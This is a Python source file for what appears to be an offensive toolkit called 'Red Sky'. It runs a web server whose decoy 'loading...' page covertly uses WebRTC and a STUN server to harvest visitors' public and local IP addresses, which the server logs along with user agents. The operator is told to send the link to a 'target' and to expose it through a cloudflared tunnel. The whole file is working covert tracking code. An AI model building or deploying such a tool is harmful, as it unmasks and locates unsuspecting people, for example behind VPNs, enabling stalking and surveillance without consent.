# language: Python, file: Program/geoip/webrtc.py, target: Red Sky geoip — WebRTC public-IP harvest
import http.server
import json
import socketserver
import sys
import time
from pathlib import Path

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR

LOG_DIR = OUTPUT_DIR / "geoip"

HOME_HTML = """<!DOCTYPE html>
<html><head><title>loading...</title></head>
<body style="background:#0a0000;color:#ff2400;font-family:monospace;padding:40px">
<h1>Red Sky</h1>
<p>loading...</p>
<script>
(async () => {
  const candidates = new Set();
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
  });
  pc.createDataChannel("dummy");
  pc.onicecandidate = (e) => {
    if (!e.candidate) return;
    const parts = e.candidate.candidate.split(" ");
    const ip = parts[4];
    if (ip && /^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) candidates.add(ip);
  };
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  await new Promise((r) => setTimeout(r, 2500));
  pc.close();
  await fetch("/post", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ candidates: Array.from(candidates) })
  });
  document.body.innerHTML = "<h1>done</h1><p>you can close this tab</p>";
})();
</script></body></html>"""

class WebRTCHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _client_ip(self):
        xff = self.headers.get("X-Forwarded-For", "")
        if xff:
            return xff.split(",")[0].strip()
        return self.client_address[0]

    def do_GET(self):
        body = HOME_HTML.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = b""
        if length > 0:
            raw = self.rfile.read(min(length, 65536))
        try:
            data = json.loads(raw.decode("utf-8", errors="replace"))
        except json.JSONDecodeError:
            data = {}
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        candidates = data.get("candidates", [])
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        log = LOG_DIR / "webrtc.jsonl"
        entry = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
            "remote_ip": ip,
            "ua": ua,
            "candidates": candidates,
        }
        with log.open("a") as f:
            f.write(json.dumps(entry) + "\n")
        print()
        print(f"{SCARLET}{BOLD}* WEBRTC HIT{RESET}  {ASH}{entry['ts']}{RESET}")
        print(f"  {ARTERY}remote_ip{RESET}  {BONE}{ip}{RESET}")
        for c in candidates:
            print(f"  {ARTERY}*{RESET} {BONE}{c}{RESET}")
        print()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

def cmd_serve(host, port):
    print_info(f"WebRTC harvest on http://{host}:{port}")
    print_kv("log", LOG_DIR / "webrtc.jsonl")
    print()
    print_info("send this link to the target:")
    print(f"  {BONE}http://{host}:{port}/{RESET}")
    print()
    print_info(f"for a public link: cloudflared tunnel --url http://localhost:{port}")
    print_info("CTRL+C to stop")
    with socketserver.ThreadingTCPServer((host, port), WebRTCHandler) as httpd:
        httpd.allow_reuse_address = True
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print()
            print_info("stopped")
    return 0

def cmd_log():
    log = LOG_DIR / "webrtc.jsonl"
    if not log.exists():
        print_warn("no hits yet")
        return 0
    for line in log.read_text().splitlines():
        try:
            e = json.loads(line)
        except json.JSONDecodeError:
            continue
        print(f"  {ARTERY}*{RESET} {ASH}{e['ts']}{RESET}  {BONE}{e['remote_ip']:<20}{RESET}")
        for c in e.get("candidates", []):
            print(f"      {ASH}{c}{RESET}")
    return 0

def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky geoip webrtc", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("action", nargs="?", default="serve")
    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky geoip webrtc [serve|hits] [--host H] [--port N]")
        return 2
    if ns.help:
        print_info("redsky geoip webrtc serve [--host 0.0.0.0] [--port 8080]")
        print_info("redsky geoip webrtc hits")
        return 0
    if ns.action in ("hits", "log"):
        return cmd_log()
    return cmd_serve(ns.host, ns.port)

if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
